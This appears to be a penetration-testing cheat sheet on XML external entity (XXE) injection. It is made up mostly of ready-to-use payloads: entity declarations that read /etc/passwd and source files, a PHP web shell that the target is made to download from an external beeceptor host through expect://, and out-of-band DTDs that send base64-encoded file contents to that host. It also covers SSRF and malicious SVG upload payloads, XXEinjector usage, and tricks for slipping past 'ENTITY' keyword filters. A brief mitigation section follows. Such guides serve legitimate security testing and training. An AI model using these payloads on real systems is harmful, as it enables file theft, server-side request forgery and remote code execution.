---
description: https://app.beeceptor.com/
---

# XML external entity (XXE) injection

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

#### Identifying

1. **Identify XML User Input**: Look for web pages or forms that accept XML input from users. This can include forms that submit data in XML format to the server.
2. **Inspect Input Filtering and Sanitization**: Check if the application applies proper input filtering or sanitization to XML input. Lack of filtering or sanitization increases the risk of XXE vulnerabilities.
3. **Observe Response Handling**: Pay attention to how the application handles user input in the response. If the application reflects XML elements back to the user without encoding, it may be vulnerable to XXE.
4. **Analyze DTD Declaration**: Determine if the XML input includes a Document Type Definition (DTD) declaration. If present, it may allow for entity declaration and expansion, leading to XXE.
5. **Add Custom Entity**: Inject a custom entity into the XML input to test for XXE. This can be done by adding a DTD declaration and defining a new entity within it.
6. **Test Entity Replacement**: Verify if the application replaces the custom entity with its defined value in the response. If the value of the entity is reflected back, it indicates potential XXE vulnerability.
7. **Check Content-Type**: Even if the application primarily uses JSON format, try changing the Content-Type header to application/XML. Some applications may accept XML data even if they primarily handle JSON.
8. **Convert JSON to XML**: If necessary, convert JSON data to XML format using online tools. Submit the XML data to the application and test for XXE vulnerabilities as described above.

## Error Based XXE

### Read File

```xml
<!--Linux -->
<?xml version="1.0"?>
<!DOCTYPE hacktor [<!ENTITY read  SYSTEM "file:///etc/passwd">]>
<check>
    <proid>&read;</proid>
</check>
```

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

## Blind Data Exfiltration

### PHP Filter&#x20;

{% code overflow="wrap" %}
```xml
<?xml version="1.0"?>
<!DOCTYPE hacktor [<!ENTITY read SYSTEM "php://filter/convert.base64-encode/resource=/index.php"> ]>
<Check><proid>&read;</proid></Check>
```
{% endcode %}

## Code Execution

PHP Wrapper <mark style="color:red;">**expect://ls**</mark>

```bash
echo '<?php system($_REQUEST['cmd'])?>' > shell.php
#up server 
python3 -m http.server 80 
```

to execute&#x20;

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'https://h3ckt00r.free.beeceptor.com/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

{% hint style="warning" %}
The <mark style="color:red;">**expect**</mark> module is not enabled/installed on modern PHP servers by default, so this attack may not always work.
{% endhint %}

## SSRF Attack

```sml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://sub.vulnerable.com/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### CDATA with XXE and SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE hacktor [ <!ENTITY read SYSTEM "https://h3ckt00r.free.beeceptor.com">]>
    <root>
        <data><![CDATA[&read;]]></data>
    </root>

```

## File Upload

{% code overflow="wrap" %}
```xml
<!-- exploit.svg -->

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
{% endcode %}

### OUT-OF\_BAND (OOB)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % read SYSTEM "https://h3ckt00r.free.beeceptor.com/xxe.dtd" > ]>

```

in Server

{% code overflow="wrap" %}
```xml
<!DOCTYPE h3ckt00r [ <!ENTITY % read SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd" > ]>
<!ENTITY % test "<!ENTITY &#x25; snedfile SYSTEM 'https://h3ckt00r.free.beeceptor.com/?x=%read;'>">
%test;
%sendfile;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

### Automated OOB Exfiltration

{% code overflow="wrap" %}
```bash
0xN1ghtM4r3@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending a request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```
{% endcode %}



## How to Find XEE

**● XML file upload (e.g config files)**&#x20;

**● XML input fields**&#x20;

**● XML based APIs**&#x20;

**● XML based files (RSS, SVG)**

## how to bypass if filters " ENTITY " word

### Case1: **Manipulation (Uppercase/Lowercase)**

```xml
<!eNtItY h3ckt00r SYSTEM "file:///etc/passwd">
```

### Case2: Encoding

* **HTML encoding**:

```xml
<!&#69;NTITY h3ckt00r SYSTEM "file:///etc/passwd">
<!-- e -> &#69; -->
```

* Hexadecimal enconding

```xml
<!&#x45;NTITY h3ckt00r SYSTEM "file:///etc/passwd">
<!-- e -> &#x45; -->
```

* Whitespace Bypasses (Extra Spaces or Newlines) Or using Comment

```xml
<!EN TITY h3ckt00r SYSTEM "file:///etc/passwd">
<!-- OR --> 
<!EN
TITY h3ckt00r SYSTEM "file:///etc/passwd">
<!-- OR using Comment -->
<!E<!-- Comment -->NTITY xxe SYSTEM "file:///etc/passwd">
```

* CDATA

```xml
<!DOCTYPE root [
  <!ENTITY % data "<![CDATA[ENTITY]]">
  %data;
]>
```

## How TO Test XXE **Methodology**

1. Find XXE Data Entry Point
2. Change the XML object to anything.
3. Try to declare a reference entity or parameter entity. **`<!DOCTYPE hacktor [ <!ENTITY xxe  SYSTEM "Hello">]>`**&#x20;
4. test Blind get server and add reference&#x20;
5. if now XML format test **Xinclude**&#x20;

## **Mitigation and** Prevention

* Avoiding Outdated Components
* Using Safe XML Configurations
  * Disable referencing custom <mark style="color:red;">**`Document Type Definitions (DTDs)`**</mark>
  * Disable referencing <mark style="color:red;">**`External XML Entities`**</mark>
  * Disable <mark style="color:red;">**`Parameter Entity`**</mark><mark style="color:red;">** **</mark><mark style="color:red;">**processing =>**</mark>&#x20;
    * ```php
      libxml_disable_entity_loader(true);
      ```
  * Disable support for <mark style="color:red;">**`XInclude`**</mark>
  * Prevent <mark style="color:red;">**`Entity Reference Loops`**</mark>
